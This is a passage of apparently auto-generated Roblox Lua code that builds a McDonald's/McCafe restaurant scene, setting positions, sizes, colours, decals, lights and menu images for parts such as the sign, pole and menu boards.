        Part130.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part130.Anchored = true
        Part130.BottomSurface = Enum.SurfaceType.Smooth
        Part130.BrickColor = BrickColor.new("Reddish brown")
        Part130.Material = Enum.Material.Wood
        Part130.TopSurface = Enum.SurfaceType.Smooth
        Part130.brickColor = BrickColor.new("Reddish brown")
        Part131.Parent = Model117
        Part131.CFrame = CFrame.new(1.80011511, 11854.6504, -28.6999321, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part131.Orientation = Vector3.new(0, 180, 0)
        Part131.Position = Vector3.new(1.8001151084899902, 11854.650390625, -28.699932098388672)
        Part131.Rotation = Vector3.new(-180, 0, -180)
        Part131.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part131.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part131.Anchored = true
        Part131.BottomSurface = Enum.SurfaceType.Smooth
        Part131.BrickColor = BrickColor.new("Reddish brown")
        Part131.Material = Enum.Material.Wood
        Part131.TopSurface = Enum.SurfaceType.Smooth
        Part131.brickColor = BrickColor.new("Reddish brown")
        Model132.Name = "McDonald's/McCafe Sign"
        Model132.Parent = Model0
        Model133.Name = "McCafe Sign"
        Model133.Parent = Model132
        Part134.Name = "McCafe Logo"
        Part134.Parent = Model133
        Part134.CFrame =
            CFrame.new(
            -24.3931732,
            11875.832,
            -40.9004211,
            -0.999999762,
            3.37552519e-05,
            0.000862559828,
            -3.37552519e-05,
            0.996941745,
            -0.0781479254,
            -0.000862559828,
            -0.0781479254,
            -0.996941566
        )
        Part134.Orientation = Vector3.new(4.480000019073486, 179.9499969482422, 0)
        Part134.Position = Vector3.new(-24.393173217773438, 11875.83203125, -40.900421142578125)
        Part134.Rotation = Vector3.new(175.52000427246094, 0.05000000074505806, -180)
        Part134.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part134.Transparency = 1
        Part134.Size = Vector3.new(0.5224510431289673, 2.3191728591918945, 6.052786350250244)
        Part134.Anchored = true
        Part134.BackSurface = Enum.SurfaceType.SmoothNoOutlines
        Part134.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
        Part134.BrickColor = BrickColor.new("Reddish brown")
        Part134.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
        Part134.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
        Part134.RightSurface = Enum.SurfaceType.SmoothNoOutlines
        Part134.TopSurface = Enum.SurfaceType.Smooth
        Part134.brickColor = BrickColor.new("Reddish brown")
        SurfaceLight135.Parent = Part134
        SurfaceLight135.Color = Color3.new(0.960784, 0.843137, 0.760784)
        SurfaceLight135.Enabled = false
        SurfaceLight135.Face = Enum.NormalId.Left
        SurfaceLight135.Range = 9
        SurfaceLight135.Brightness = 15
        SurfaceLight135.Angle = 65
        Decal136.Parent = Part134
        Decal136.Texture = "http://www.roblox.com/asset/?id=211393929"
        Decal136.Face = Enum.NormalId.Left
        UnionOperation137.Name = "Sign"
        UnionOperation137.Parent = Model133
        UnionOperation137.CFrame = CFrame.new(-24.4089508, 11875.7803, -40.9004326, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        UnionOperation137.Orientation = Vector3.new(0, 90, 0)
        UnionOperation137.Position = Vector3.new(-24.408950805664062, 11875.7802734375, -40.90043258666992)
        UnionOperation137.Rotation = Vector3.new(0, 90, 0)
        UnionOperation137.Color = Color3.new(0.411765, 0.25098, 0.156863)
        UnionOperation137.Size = Vector3.new(9.543426513671875, 3.242443561553955, 0.3129163384437561)
        UnionOperation137.Anchored = true
        UnionOperation137.BrickColor = BrickColor.new("Reddish brown")
        UnionOperation137.Material = Enum.Material.SmoothPlastic
        UnionOperation137.brickColor = BrickColor.new("Reddish brown")
        Decal138.Name = "Black"
        Decal138.Parent = UnionOperation137
        Decal138.Texture = "http://www.roblox.com/asset/?id=1539341292"
        Decal139.Name = "Black"
        Decal139.Parent = UnionOperation137
        Decal139.Texture = "http://www.roblox.com/asset/?id=1539341292"
        Decal139.Face = Enum.NormalId.Right
        Decal140.Name = "Black"
        Decal140.Parent = UnionOperation137
        Decal140.Texture = "http://www.roblox.com/asset/?id=1539341292"
        Decal140.Face = Enum.NormalId.Left
        Decal141.Name = "Black"
        Decal141.Parent = UnionOperation137
        Decal141.Texture = "http://www.roblox.com/asset/?id=1539341292"
        Decal141.Face = Enum.NormalId.Top
        Decal142.Name = "Black"
        Decal142.Parent = UnionOperation137
        Decal142.Texture = "http://www.roblox.com/asset/?id=1539341292"
        Decal142.Face = Enum.NormalId.Bottom
        Model143.Name = "McCafe Sign"
        Model143.Parent = Model132
        Part144.Name = "McCafe Logo"
        Part144.Parent = Model143
        Part144.CFrame =
            CFrame.new(
            -25.6270294,
            11875.8662,
            -40.9004211,
            0.999999642,
            -3.37552519e-05,
            -0.000862559828,
            -3.37552519e-05,
            0.996941745,
            -0.0781479254,
            0.000862559828,
            0.0781479254,
            0.996941388
        )
        Part144.Orientation = Vector3.new(4.480000019073486, -0.05000000074505806, 0)
        Part144.Position = Vector3.new(-25.627029418945312, 11875.8662109375, -40.900421142578125)
        Part144.Rotation = Vector3.new(4.480000019073486, -0.05000000074505806, 0)
        Part144.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part144.Transparency = 1
        Part144.Size = Vector3.new(0.5224510431289673, 2.3191728591918945, 6.052786350250244)
        Part144.Anchored = true
        Part144.BackSurface = Enum.SurfaceType.SmoothNoOutlines
        Part144.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
        Part144.BrickColor = BrickColor.new("Reddish brown")
        Part144.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
        Part144.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
        Part144.RightSurface = Enum.SurfaceType.SmoothNoOutlines
        Part144.TopSurface = Enum.SurfaceType.Smooth
        Part144.brickColor = BrickColor.new("Reddish brown")
        Decal145.Parent = Part144
        Decal145.Texture = "http://www.roblox.com/asset/?id=211393929"
        Decal145.Face = Enum.NormalId.Left
        SurfaceLight146.Parent = Part144
        SurfaceLight146.Color = Color3.new(0.960784, 0.843137, 0.760784)
        SurfaceLight146.Enabled = false
        SurfaceLight146.Face = Enum.NormalId.Left
        SurfaceLight146.Range = 9
        SurfaceLight146.Brightness = 15
        SurfaceLight146.Angle = 65
        UnionOperation147.Name = "Sign"
        UnionOperation147.Parent = Model143
        UnionOperation147.CFrame = CFrame.new(-25.6112671, 11875.8145, -40.9004364, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        UnionOperation147.Orientation = Vector3.new(0, -90, 0)
        UnionOperation147.Position = Vector3.new(-25.61126708984375, 11875.814453125, -40.90043640136719)
        UnionOperation147.Rotation = Vector3.new(0, -90, 0)
        UnionOperation147.Color = Color3.new(0.411765, 0.25098, 0.156863)
        UnionOperation147.Size = Vector3.new(9.543426513671875, 3.242443561553955, 0.3129163384437561)
        UnionOperation147.Anchored = true
        UnionOperation147.BrickColor = BrickColor.new("Reddish brown")
        UnionOperation147.Material = Enum.Material.SmoothPlastic
        UnionOperation147.brickColor = BrickColor.new("Reddish brown")
        Decal148.Name = "Black"
        Decal148.Parent = UnionOperation147
        Decal148.Texture = "http://www.roblox.com/asset/?id=1539341292"
        Decal149.Name = "Black"
        Decal149.Parent = UnionOperation147
        Decal149.Texture = "http://www.roblox.com/asset/?id=1539341292"
        Decal149.Face = Enum.NormalId.Left
        Decal150.Name = "Black"
        Decal150.Parent = UnionOperation147
        Decal150.Texture = "http://www.roblox.com/asset/?id=1539341292"
        Decal150.Face = Enum.NormalId.Right
        Decal151.Name = "Black"
        Decal151.Parent = UnionOperation147
        Decal151.Texture = "http://www.roblox.com/asset/?id=1539341292"
        Decal151.Face = Enum.NormalId.Top
        Decal152.Name = "Black"
        Decal152.Parent = UnionOperation147
        Decal152.Texture = "http://www.roblox.com/asset/?id=1539341292"
        Decal152.Face = Enum.NormalId.Bottom
        Part153.Name = "Pole"
        Part153.Parent = Model132
        Part153.CFrame = CFrame.new(-24.999939, 11866.5459, -40.8999329, 0, 1, 0, -1, 0, 0, 0, 0, 1)
        Part153.Orientation = Vector3.new(0, 0, -90)
        Part153.Position = Vector3.new(-24.99993896484375, 11866.5458984375, -40.899932861328125)
        Part153.Rotation = Vector3.new(0, 0, -90)
        Part153.Color = Color3.new(0.105882, 0.164706, 0.207843)
        Part153.Size = Vector3.new(24.6200008392334, 1, 1)
        Part153.Anchored = true
        Part153.BackSurface = Enum.SurfaceType.SmoothNoOutlines
        Part153.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
        Part153.BrickColor = BrickColor.new("Black")
        Part153.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
        Part153.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
        Part153.Material = Enum.Material.Metal
        Part153.RightSurface = Enum.SurfaceType.SmoothNoOutlines
        Part153.TopParamA = -0.10000000149011612
        Part153.TopParamB = 0.10000000149011612
        Part153.TopSurface = Enum.SurfaceType.SmoothNoOutlines
        Part153.TopSurfaceInput = Enum.InputType.Constant
        Part153.brickColor = BrickColor.new("Black")
        Part153.Shape = Enum.PartType.Cylinder
        Part154.Name = "Support"
        Part154.Parent = Model132
        Part154.CFrame = CFrame.new(-24.9971313, 11879.2402, -40.9000015, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part154.Position = Vector3.new(-24.99713134765625, 11879.240234375, -40.900001525878906)
        Part154.Color = Color3.new(0.105882, 0.164706, 0.207843)
        Part154.Size = Vector3.new(1, 0.800000011920929, 6)
        Part154.Anchored = true
        Part154.BackSurface = Enum.SurfaceType.SmoothNoOutlines
        Part154.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
        Part154.BrickColor = BrickColor.new("Black")
        Part154.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
        Part154.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
        Part154.Material = Enum.Material.Metal
        Part154.RightSurface = Enum.SurfaceType.SmoothNoOutlines
        Part154.TopSurface = Enum.SurfaceType.Smooth
        Part154.brickColor = BrickColor.new("Black")
        MeshPart155.Name = "Logo"
        MeshPart155.Parent = Model132
        MeshPart155.CFrame = CFrame.new(-24.9972229, 11886.7129, -40.9003601, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        MeshPart155.Orientation = Vector3.new(0, 90, 0)
        MeshPart155.Position = Vector3.new(-24.997222900390625, 11886.712890625, -40.900360107421875)
        MeshPart155.Rotation = Vector3.new(0, 90, 0)
        MeshPart155.Color = Color3.new(1, 0.764706, 0)
        MeshPart155.Size = Vector3.new(9.416000366210938, 8.23799991607666, 1.5)
        MeshPart155.Anchored = true
        MeshPart155.BrickColor = BrickColor.new("Deep orange")
        MeshPart155.Material = Enum.Material.SmoothPlastic
        MeshPart155.brickColor = BrickColor.new("Deep orange")
        SurfaceLight156.Parent = MeshPart155
        SurfaceLight156.Enabled = false
        SurfaceLight156.Range = 11
        SurfaceLight157.Parent = MeshPart155
        SurfaceLight157.Enabled = false
        SurfaceLight157.Face = Enum.NormalId.Back
        Decal158.Name = "Yellow"
        Decal158.Parent = MeshPart155
        Decal158.Texture = "http://www.roblox.com/asset/?id=3839144290"
        Decal158.Face = Enum.NormalId.Left
        Decal159.Name = "Yellow"
        Decal159.Parent = MeshPart155
        Decal159.Texture = "http://www.roblox.com/asset/?id=3839144290"
        Decal159.Face = Enum.NormalId.Top
        Decal160.Name = "Yellow"
        Decal160.Parent = MeshPart155
        Decal160.Texture = "http://www.roblox.com/asset/?id=3839144290"
        Decal160.Face = Enum.NormalId.Right
        Decal161.Name = "Yellow"
        Decal161.Parent = MeshPart155
        Decal161.Texture = "http://www.roblox.com/asset/?id=3839144290"
        Decal161.Face = Enum.NormalId.Bottom
        Part162.Name = "Base"
        Part162.Parent = Model132
        Part162.CFrame = CFrame.new(-25, 11854.0498, -40.9000015, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part162.Position = Vector3.new(-25, 11854.0498046875, -40.900001525878906)
        Part162.Color = Color3.new(0.105882, 0.164706, 0.207843)
        Part162.Size = Vector3.new(2, 0.4000000059604645, 2)
        Part162.Anchored = true
        Part162.BackSurface = Enum.SurfaceType.SmoothNoOutlines
        Part162.BrickColor = BrickColor.new("Black")
        Part162.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
        Part162.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
        Part162.Material = Enum.Material.Metal
        Part162.RightSurface = Enum.SurfaceType.SmoothNoOutlines
        Part162.TopSurface = Enum.SurfaceType.Smooth
        Part162.brickColor = BrickColor.new("Black")
        ManualWeld163.Name = "Base-to-Pole Strong Joint"
        ManualWeld163.Parent = Part162
        ManualWeld163.C0 = CFrame.new(-1, 0.200000003, 1, -1, 0, 0, 0, 0, 1, 0, 1, -0)
        ManualWeld163.C1 = CFrame.new(12.2949972, -0.999641418, 1.00031281, 0, 0, -1, -1, 0, 0, 0, 1, 0)
        ManualWeld163.Part0 = Part162
        ManualWeld163.Part1 = Part153
        ManualWeld163.part1 = Part153
        UnionOperation164.Name = "Red"
        UnionOperation164.Parent = Model132
        UnionOperation164.CFrame = CFrame.new(-24.9972229, 11881.5342, -40.9003601, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        UnionOperation164.Orientation = Vector3.new(0, -90, 0)
        UnionOperation164.Position = Vector3.new(-24.997222900390625, 11881.5341796875, -40.900360107421875)
        UnionOperation164.Rotation = Vector3.new(0, -90, 0)
        UnionOperation164.Color = Color3.new(0.866667, 0.0627451, 0.129412)
        UnionOperation164.Size = Vector3.new(11.700004577636719, 3.9000072479248047, 1.2500019073486328)
        UnionOperation164.Anchored = true
        UnionOperation164.BrickColor = BrickColor.new("Bright red")
        UnionOperation164.Material = Enum.Material.SmoothPlastic
        UnionOperation164.brickColor = BrickColor.new("Bright red")
        UnionOperation165.Name = "Frame"
        UnionOperation165.Parent = Model132
        UnionOperation165.CFrame = CFrame.new(-24.9972229, 11881.5342, -40.9003601, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        UnionOperation165.Orientation = Vector3.new(0, -90, 0)
        UnionOperation165.Position = Vector3.new(-24.997222900390625, 11881.5341796875, -40.900360107421875)
        UnionOperation165.Rotation = Vector3.new(0, -90, 0)
        UnionOperation165.Color = Color3.new(0.105882, 0.164706, 0.207843)
        UnionOperation165.Size = Vector3.new(12.299972534179688, 4.30000114440918, 1.2500038146972656)
        UnionOperation165.Anchored = true
        UnionOperation165.BrickColor = BrickColor.new("Black")
        UnionOperation165.Material = Enum.Material.Metal
        UnionOperation165.brickColor = BrickColor.new("Black")
        MeshPart166.Name = "Wordmark"
        MeshPart166.Parent = Model132
        MeshPart166.CFrame = CFrame.new(-25.5978394, 11881.5244, -40.9001617, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        MeshPart166.Orientation = Vector3.new(0, 90, 0)
        MeshPart166.Position = Vector3.new(-25.59783935546875, 11881.5244140625, -40.90016174316406)
        MeshPart166.Rotation = Vector3.new(0, 90, 0)
        MeshPart166.Color = Color3.new(0.972549, 0.972549, 0.972549)
        MeshPart166.Size = Vector3.new(9.538999557495117, 1.2039999961853027, 0.05000000074505806)
        MeshPart166.Anchored = true
        MeshPart166.BrickColor = BrickColor.new("Institutional white")
        MeshPart166.Material = Enum.Material.SmoothPlastic
        MeshPart166.brickColor = BrickColor.new("Institutional white")
        MeshPart167.Name = "Wordmark"
        MeshPart167.Parent = Model132
        MeshPart167.CFrame = CFrame.new(-24.3968201, 11881.5244, -40.9001541, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        MeshPart167.Orientation = Vector3.new(0, -90, 0)
        MeshPart167.Position = Vector3.new(-24.396820068359375, 11881.5244140625, -40.90015411376953)
        MeshPart167.Rotation = Vector3.new(0, -90, 0)
        MeshPart167.Color = Color3.new(0.972549, 0.972549, 0.972549)
        MeshPart167.Size = Vector3.new(9.538999557495117, 1.2039999961853027, 0.05000000074505806)
        MeshPart167.Anchored = true
        MeshPart167.BrickColor = BrickColor.new("Institutional white")
        MeshPart167.Material = Enum.Material.SmoothPlastic
        MeshPart167.brickColor = BrickColor.new("Institutional white")
        Model168.Name = "Menu"
        Model168.Parent = Model0
        Part169.Parent = Model168
        Part169.CFrame = CFrame.new(21.2999992, 11863.2002, -1.99998927, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part169.Orientation = Vector3.new(0, 90, 0)
        Part169.Position = Vector3.new(21.299999237060547, 11863.2001953125, -1.9999892711639404)
        Part169.Rotation = Vector3.new(0, 90, 0)
        Part169.Color = Color3.new(0.196078, 0.196078, 0.196078)
        Part169.Size = Vector3.new(17.200000762939453, 0.09999990463256836, 0.20000000298023224)
        Part169.Anchored = true
        Part169.BottomSurface = Enum.SurfaceType.Smooth
        Part169.BrickColor = BrickColor.new("Black")
        Part169.TopSurface = Enum.SurfaceType.Smooth
        Part169.brickColor = BrickColor.new("Black")
        Part170.Parent = Model168
        Part170.CFrame = CFrame.new(21.2999992, 11861.751, -10.5499916, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part170.Orientation = Vector3.new(0, 90, 0)
        Part170.Position = Vector3.new(21.299999237060547, 11861.7509765625, -10.549991607666016)
        Part170.Rotation = Vector3.new(0, 90, 0)
        Part170.Color = Color3.new(0.196078, 0.196078, 0.196078)
        Part170.Size = Vector3.new(0.10000000149011612, 2.799999952316284, 0.20000000298023224)
        Part170.Anchored = true
        Part170.BottomSurface = Enum.SurfaceType.Smooth
        Part170.BrickColor = BrickColor.new("Black")
        Part170.TopSurface = Enum.SurfaceType.Smooth
        Part170.brickColor = BrickColor.new("Black")
        Part171.Parent = Model168
        Part171.CFrame = CFrame.new(21.2999992, 11860.2998, -1.99998927, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part171.Orientation = Vector3.new(0, 90, 0)
        Part171.Position = Vector3.new(21.299999237060547, 11860.2998046875, -1.9999892711639404)
        Part171.Rotation = Vector3.new(0, 90, 0)
        Part171.Color = Color3.new(0.196078, 0.196078, 0.196078)
        Part171.Size = Vector3.new(17.200000762939453, 0.09999990463256836, 0.20000000298023224)
        Part171.Anchored = true
        Part171.BottomSurface = Enum.SurfaceType.Smooth
        Part171.BrickColor = BrickColor.new("Black")
        Part171.TopSurface = Enum.SurfaceType.Smooth
        Part171.brickColor = BrickColor.new("Black")
        Part172.Parent = Model168
        Part172.CFrame = CFrame.new(21.2999992, 11861.751, -4.84999561, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part172.Orientation = Vector3.new(0, 90, 0)
        Part172.Position = Vector3.new(21.299999237060547, 11861.7509765625, -4.8499956130981445)
        Part172.Rotation = Vector3.new(0, 90, 0)
        Part172.Color = Color3.new(0.196078, 0.196078, 0.196078)
        Part172.Size = Vector3.new(0.10000000149011612, 2.799999952316284, 0.20000000298023224)
        Part172.Anchored = true
        Part172.BottomSurface = Enum.SurfaceType.Smooth
        Part172.BrickColor = BrickColor.new("Black")
        Part172.TopSurface = Enum.SurfaceType.Smooth
        Part172.brickColor = BrickColor.new("Black")
        Part173.Parent = Model168
        Part173.CFrame = CFrame.new(21.2999992, 11861.751, 6.54999828, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part173.Orientation = Vector3.new(0, 90, 0)
        Part173.Position = Vector3.new(21.299999237060547, 11861.7509765625, 6.5499982833862305)
        Part173.Rotation = Vector3.new(0, 90, 0)
        Part173.Color = Color3.new(0.196078, 0.196078, 0.196078)
        Part173.Size = Vector3.new(0.10000000149011612, 2.799999952316284, 0.20000000298023224)
        Part173.Anchored = true
        Part173.BottomSurface = Enum.SurfaceType.Smooth
        Part173.BrickColor = BrickColor.new("Black")
        Part173.TopSurface = Enum.SurfaceType.Smooth
        Part173.brickColor = BrickColor.new("Black")
        Part174.Parent = Model168
        Part174.CFrame = CFrame.new(21.2999992, 11861.751, 0.849986196, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part174.Orientation = Vector3.new(0, 90, 0)
        Part174.Position = Vector3.new(21.299999237060547, 11861.7509765625, 0.84998619556427)
        Part174.Rotation = Vector3.new(0, 90, 0)
        Part174.Color = Color3.new(0.196078, 0.196078, 0.196078)
        Part174.Size = Vector3.new(0.10000000149011612, 2.799999952316284, 0.20000000298023224)
        Part174.Anchored = true
        Part174.BottomSurface = Enum.SurfaceType.Smooth
        Part174.BrickColor = BrickColor.new("Black")
        Part174.TopSurface = Enum.SurfaceType.Smooth
        Part174.brickColor = BrickColor.new("Black")
        Part175.Parent = Model168
        Part175.CFrame = CFrame.new(21.2999992, 11861.751, -7.70000172, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part175.Orientation = Vector3.new(0, 90, 0)
        Part175.Position = Vector3.new(21.299999237060547, 11861.7509765625, -7.7000017166137695)
        Part175.Rotation = Vector3.new(0, 90, 0)
        Part175.Color = Color3.new(0.196078, 0.196078, 0.196078)
        Part175.Size = Vector3.new(5.59999942779541, 2.799999952316284, 0.20000000298023224)
        Part175.Anchored = true
        Part175.BottomSurface = Enum.SurfaceType.Smooth
        Part175.BrickColor = BrickColor.new("Black")
        Part175.TopSurface = Enum.SurfaceType.Smooth
        Part175.brickColor = BrickColor.new("Black")
        SurfaceGui176.Parent = Part175
        SurfaceGui176.CanvasSize = Vector2.new(1026, 648)
        ImageLabel177.Parent = SurfaceGui176
        ImageLabel177.Size = UDim2.new(1, 0, 1, 0)
        ImageLabel177.BackgroundColor = BrickColor.new("Institutional white")
        ImageLabel177.BackgroundColor3 = Color3.new(1, 1, 1)
        ImageLabel177.BorderSizePixel = 0
        ImageLabel177.Image = "rbxassetid://8518856524"
        Part178.Parent = Model168
        Part178.CFrame = CFrame.new(21.2999992, 11861.751, -1.99998927, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part178.Orientation = Vector3.new(0, 90, 0)
        Part178.Position = Vector3.new(21.299999237060547, 11861.7509765625, -1.9999892711639404)
        Part178.Rotation = Vector3.new(0, 90, 0)
        Part178.Color = Color3.new(0.196078, 0.196078, 0.196078)
        Part178.Size = Vector3.new(5.59999942779541, 2.799999952316284, 0.20000000298023224)
        Part178.Anchored = true
        Part178.BottomSurface = Enum.SurfaceType.Smooth
        Part178.BrickColor = BrickColor.new("Black")
        Part178.TopSurface = Enum.SurfaceType.Smooth
        Part178.brickColor = BrickColor.new("Black")
        SurfaceGui179.Parent = Part178
        SurfaceGui179.CanvasSize = Vector2.new(1026, 648)
        ImageLabel180.Parent = SurfaceGui179
        ImageLabel180.Size = UDim2.new(1, 0, 1, 0)
        ImageLabel180.BackgroundColor = BrickColor.new("Institutional white")
        ImageLabel180.BackgroundColor3 = Color3.new(1, 1, 1)
        ImageLabel180.BorderSizePixel = 0
        ImageLabel180.Image = "rbxassetid://8518856746"
        Part181.Parent = Model168
        Part181.CFrame = CFrame.new(21.2999992, 11861.751, 3.69999218, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part181.Orientation = Vector3.new(0, 90, 0)
        Part181.Position = Vector3.new(21.299999237060547, 11861.7509765625, 3.6999921798706055)
        Part181.Rotation = Vector3.new(0, 90, 0)
        Part181.Color = Color3.new(0.196078, 0.196078, 0.196078)
        Part181.Size = Vector3.new(5.59999942779541, 2.799999952316284, 0.20000000298023224)
        Part181.Anchored = true
        Part181.BottomSurface = Enum.SurfaceType.Smooth
        Part181.BrickColor = BrickColor.new("Black")
        Part181.TopSurface = Enum.SurfaceType.Smooth
        Part181.brickColor = BrickColor.new("Black")
        SurfaceGui182.Parent = Part181
        SurfaceGui182.CanvasSize = Vector2.new(1026, 648)
        ImageLabel183.Parent = SurfaceGui182
        ImageLabel183.Size = UDim2.new(1, 0, 1, 0)
        ImageLabel183.BackgroundColor = BrickColor.new("Institutional white")
        ImageLabel183.BackgroundColor3 = Color3.new(1, 1, 1)
        ImageLabel183.BorderSizePixel = 0
        ImageLabel183.Image = "rbxassetid://8518856908"
        Part184.Parent = Model0
        Part184.CFrame = CFrame.new(23, 11862.501, 32.1499977, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part184.Position = Vector3.new(23, 11862.5009765625, 32.14999771118164)
        Part184.Color = Color3.new(1, 1, 0.8)
        Part184.Size = Vector3.new(60, 17.299999237060547, 0.10000000149011612)
        Part184.Anchored = true
        Part184.BottomSurface = Enum.SurfaceType.Smooth
        Part184.BrickColor = BrickColor.new("Pastel yellow")
        Part184.Material = Enum.Material.Brick
        Part184.TopSurface = Enum.SurfaceType.Smooth
        Part184.brickColor = BrickColor.new("Pastel yellow")
        Part185.Parent = Model0
        Part185.CFrame = CFrame.new(14.5, 11853.9004, -35.0499954, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part185.Position = Vector3.new(14.5, 11853.900390625, -35.04999542236328)
        Part185.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part185.Size = Vector3.new(77, 0.09999996423721313, 9.699999809265137)
        Part185.Anchored = true
        Part185.BottomSurface = Enum.SurfaceType.Smooth
        Part185.BrickColor = BrickColor.new("Dark stone grey")
        Part185.Material = Enum.Material.Concrete
        Part185.TopSurface = Enum.SurfaceType.Smooth
        Part185.brickColor = BrickColor.new("Dark stone grey")
        Part186.Parent = Model0
        Part186.CFrame = CFrame.new(23.0499954, 11861.1504, 32.0500183, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part186.Orientation = Vector3.new(0, -90, 0)
        Part186.Position = Vector3.new(23.04999542236328, 11861.150390625, 32.050018310546875)
        Part186.Rotation = Vector3.new(0, -90, 0)
        Part186.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part186.Size = Vector3.new(0.10000000149011612, 6.999999523162842, 59.900001525878906)
        Part186.Anchored = true
        Part186.BottomSurface = Enum.SurfaceType.Smooth
        Part186.BrickColor = BrickColor.new("White")
        Part186.Material = Enum.Material.SmoothPlastic
        Part186.TopSurface = Enum.SurfaceType.Smooth
        Part186.brickColor = BrickColor.new("White")
        Part187.Parent = Model0
        Part187.CFrame = CFrame.new(-10.6999998, 11872.6504, -1.84999216, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part187.Orientation = Vector3.new(0, 180, 0)
        Part187.Position = Vector3.new(-10.699999809265137, 11872.650390625, -1.8499921560287476)
        Part187.Rotation = Vector3.new(-180, 0, -180)
        Part187.Color = Color3.new(1, 0, 0)
        Part187.Size = Vector3.new(7.400000095367432, 3, 0.10000000149011612)
        Part187.Anchored = true
        Part187.BottomSurface = Enum.SurfaceType.Smooth
        Part187.BrickColor = BrickColor.new("Really red")
        Part187.Material = Enum.Material.SmoothPlastic
        Part187.TopSurface = Enum.SurfaceType.Smooth
        Part187.brickColor = BrickColor.new("Really red")
        Part188.Parent = Model0
        Part188.CFrame = CFrame.new(21.1499996, 11871.0498, 22.5499935, 0, 1, 0, -1, 0, 0, 0, 0, 1)
        Part188.Orientation = Vector3.new(0, 0, -90)
        Part188.Position = Vector3.new(21.149999618530273, 11871.0498046875, 22.54999351501465)
        Part188.Rotation = Vector3.new(0, 0, -90)
        Part188.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part188.Size = Vector3.new(0.19999989867210388, 55.899993896484375, 19.099998474121094)
        Part188.Anchored = true
        Part188.BottomSurface = Enum.SurfaceType.Smooth
        Part188.BrickColor = BrickColor.new("Dark stone grey")
        Part188.Material = Enum.Material.SmoothPlastic
        Part188.TopSurface = Enum.SurfaceType.Smooth
        Part188.brickColor = BrickColor.new("Dark stone grey")
        Part189.Parent = Model0
        Part189.CFrame = CFrame.new(32.9499931, 11861.1504, 13.050004, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part189.Position = Vector3.new(32.94999313354492, 11861.150390625, 13.050004005432129)
        Part189.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part189.Size = Vector3.new(39.900001525878906, 7, 0.10000000149011612)
        Part189.Anchored = true
        Part189.BottomSurface = Enum.SurfaceType.Smooth
        Part189.BrickColor = BrickColor.new("White")
        Part189.Material = Enum.Material.SmoothPlastic
        Part189.TopSurface = Enum.SurfaceType.Smooth
        Part189.brickColor = BrickColor.new("White")
        Part190.Parent = Model0
        Part190.CFrame = CFrame.new(21.4499969, 11861.1504, -2.44998837, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part190.Position = Vector3.new(21.449996948242188, 11861.150390625, -2.44998836517334)
        Part190.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part190.Size = Vector3.new(0.09999728202819824, 7, 30.899999618530273)
        Part190.Anchored = true
        Part190.BottomSurface = Enum.SurfaceType.Smooth
        Part190.BrickColor = BrickColor.new("White")
        Part190.Material = Enum.Material.SmoothPlastic
        Part190.TopSurface = Enum.SurfaceType.Smooth
        Part190.brickColor = BrickColor.new("White")
        Part191.Name = "Floor"
        Part191.Parent = Model0
        Part191.CFrame = CFrame.new(32.9999924, 11853.9004, 0.950005531, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part191.Position = Vector3.new(32.99999237060547, 11853.900390625, 0.9500055313110352)
        Part191.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part191.Size = Vector3.new(40, 0.10000000149011612, 62.29999923706055)
        Part191.Anchored = true
        Part191.BottomSurface = Enum.SurfaceType.Smooth
        Part191.BrickColor = BrickColor.new("White")
        Part191.Material = Enum.Material.SmoothPlastic
        Part191.TopSurface = Enum.SurfaceType.Smooth
        Part191.brickColor = BrickColor.new("White")
        Texture192.Parent = Part191
        Texture192.Texture = "rbxassetid://4224711125"
        Texture192.Face = Enum.NormalId.Top
        Texture192.Color3 = Color3.new(0.831373, 0.831373, 0.831373)
        Texture192.StudsPerTileU = 5.5
        Texture192.StudsPerTileV = 5.5
        Part193.Parent = Model0
